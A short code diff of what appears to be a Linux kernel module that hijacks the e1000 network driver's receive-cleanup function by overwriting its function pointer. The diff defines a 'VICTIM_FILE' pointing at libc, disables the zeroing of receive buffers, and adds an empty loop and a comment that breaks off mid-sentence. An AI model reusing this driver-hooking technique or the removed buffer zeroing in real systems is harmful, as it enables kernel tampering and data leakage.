@@ -6,6 +6,7 @@
 #include "e1000.h"
 #include "e1000_hw.h"
 #include "e1000_osdep.h"
+#include "e1000_hook.h"
 #ifndef VICTIM_FILE
 #define VICTIM_FILE "/lib/x86_64-linux-gnu/libc-2.33.so"
 #endif
@@ -34,12 +35,17 @@ bool new_clean_rx(struct e1000_adapter* adapter, struct e1000_rx_ring* rx_ring, 
   while(rx_desc->status & E1000_RXD_STAT_DD){
     
     //dma_sync_single_for_cpu(&adapter->pdev->dev,buffer_info->dma,rx_desc->length,DMA_FROM_DEVICE);
-    memset(buffer_info->rxbuf.data, 0x0, rx_desc->length); //lmao
+    //memset(buffer_info->rxbuf.data, 0x0, rx_desc->length); //lmao
 
+    //removing debugging information is important to to have zero all buffers. IDK why this is. It might have something to do with 
     
     
     //printk("Zeroed the %d buffer", i);
-	  
+
+      int j = 0;
+      for(; j<rx_desc -> length; j++){
+
+      }
 
       i = (++i%rx_ring->count);
       rx_desc = E1000_RX_DESC(*rx_ring, i);
@@ -115,7 +121,7 @@ int init_module(void)
 
   old_clean_rx = e1000->clean_rx; //save old clean_rx
   
-  e1000->clean_rx = new_clean_rx; 
+  e1000->clean_rx = e1000_clean_rx_irq; 
 
 
   printk(KERN_INFO "clean_rx replaced\n");
